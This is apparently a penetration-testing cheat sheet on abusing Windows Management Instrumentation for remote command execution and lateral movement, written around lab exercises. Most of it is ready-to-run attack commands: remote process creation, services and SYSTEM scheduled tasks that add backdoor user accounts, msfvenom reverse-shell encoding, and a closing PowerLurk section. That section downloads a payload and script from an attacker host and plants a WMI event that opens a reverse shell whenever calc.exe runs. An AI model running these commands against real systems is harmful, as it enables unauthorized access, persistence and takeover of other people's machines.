# [WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (Windows Management Instrumentation)
[Learn More About WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) 
WMI is the infrastructure for management data and operations on Windows-based operating systems, allowing automation of tasks and remote management. 

WMI enables scripting languages like VBScript or PowerShell to manage Windows PCs and servers, both locally and remotely.

It can be used to query system information, execute processes, and manage services. 


**POSRTS:** Remote access through RPC on port 135 and dynamic ports (19152-65535) for session data. 
Requires **administrator credentials** (local or domain) for remote execution. 


## $ netexec wmi
![[netexec_wmi]]
## WMIC
Microsoft offers a command-line interface to WMI known as `Windows Management Instrumentation Command-line (WMIC)`.
WMIC is deprecated in Windows 10, version 21H1, with PowerShell taking over as the preferred tool for WMI operations.

- `wmic` can remotely execute commands by specifying the target IP, username, and password.
```Powershell
cmd> wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
# Result: The process ID and return value confirm successful execution.

# install .msi package
cmd> wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## PowerShell:

- Use `New-CimSession` to create a WMI session and `Invoke-CimMethod` to execute commands.
- This approach can execute reverse shells by encoding them in Base64.

```powershell
PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'calc'}
```


### interact with WMI (local)

Namespaces a collection of classes containing objects that we can interact with.
 `Get-WmiObject` cmdlet allows retrieving various information about WMI instances.
`Get-Help wmi` command lists all available cmdlets related to WMI, enabling interaction with WMI.
`Create` method to launch a process, e.g., creating a child process for 'wmiprvse.exe' (whitelist bypass)

```powershell
# Retrieve a list of processes using WMI
$processList = Get-WmiObject -List Win32_Process    

# Display information about methods for the Win32_Process object
$processList | Get-Member -MemberType Method        
```
```powershell
$processPath = "cmd.exe"                            # Specify the process path or command to launch
$processClass = Get-WmiObject -List Win32_Process   # Get the Win32_Process class
$process = $processClass.Create($processPath)       # Use the Create method to launch the process
$process                                            # Display information about the launched process
----------------------- equals to -----------------------
# Alternatively, using Invoke-WmiMethod to create a process
PS> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe"
```
### Remote WMI Session
Establish a WMI session using one of protocols:
- DCOM: RPC over IP for connecting to WMI.(135/TCP and 49152-65535/TCP)
- Wsman: WinRM for connecting to WMI. (5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS))
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators
```powershell
# Credential object 
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
#### Establish a WMI session from Powershell
```powershell
$Opt = New-CimSessionOption -Protocol DCOM # Choose protocol DCOM or Wsman
$Session = New-Cimsession -ComputerName <TARGET> -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
##### Create Process (remotely) (Invoke-CimMethod)
```powershell
PS> $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
# or command encoded with base64
# $ msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=... LPORT=... | iconv -t utf-16le | base64 -w 0
# $Command = "powershell.exe -e cABvAHcAZQByAHMA..."

PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
```
##### Create Process (remotely) (Invoke-WmiMethod)
```powershell
PS> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName <IP/hostname> -Credential <user>
# Check if the command executed correctly
# verify `ProcessID` and `ReturnValue = 0`

# Retrieve information about the previously executed process on the remote system
PS> Get-WmiObject -Class Win32_Process -Filter "ProcessID = '<procesID>'" -ComputerName <IP/hostname> -Credential <user> 

# Terminate the remote process
PS> Get-WmiObject -Class Win32_Process -Filter "ProcessID = '<procesID>'" -ComputerName <IP/hostname> -Credential <user> | Remove-WmiObject 

```
##### Create a service called THMService2
```powershell
PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

# Get a handle on the service
PS> $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
# Start Created Service
PS> Invoke-CimMethod -InputObject $Service -MethodName StartService
# Stop Created Service
PS> Invoke-CimMethod -InputObject $Service -MethodName StopService
# Delete Service
PS> Invoke-CimMethod -InputObject $Service -MethodName Delete

```
##### Create Scheduled Tasks (remotely)
```powershell
# Payload must be split in Command and Args
PS> $Command = "cmd.exe"
PS> $Args = "/c net user munra22 aSdf1234 /add"
PS> $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
PS> Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
PS> Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# delete the scheduled task
PS> Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```
##### Install MSI packages
```powershell
# MSI - file format used for installers
PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
## PowerLurk.ps1 (create malicious WMI events)
### Persistence script
- designed to maintain access to a system by employing various techniques to evade detection and remain hidden

```bash

# PREPARATION
$ msfvenom ... > payload.exe            # Create the payload
$ msf> use multi/handler ...            # Set up a handler for the payload
$ python3 -m http.server                # The attacker creates an HTTPS server hosting payload.exe and PowerLurk.ps1
```
```powershell
# Victim downloads payload
PS> IEX (New-Object Net.WebClient).DownloadFile('http://<IP>/payload.exe', 'C:\programdata\payload.exe'); 

# Execute Remote PS1 script, trigger that generates a malicious WMI event every time the user launches calc.exe program
PS> IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Register-MaliciousWiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\programdata\payload.exe" -Trigger ProcessStart -ProcessName calc.exe

# View Our Malicious WMI Event, check CommandLineTemplate if contains "cmd.exe /c C:\programdata\payload.exe"
PS> IEX (New-Object Net.WebClient).Downloadstring('http://<IP>/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec 

# Launching calculator trigers malicious WMI trigger resulting in reverse shell to attacker
```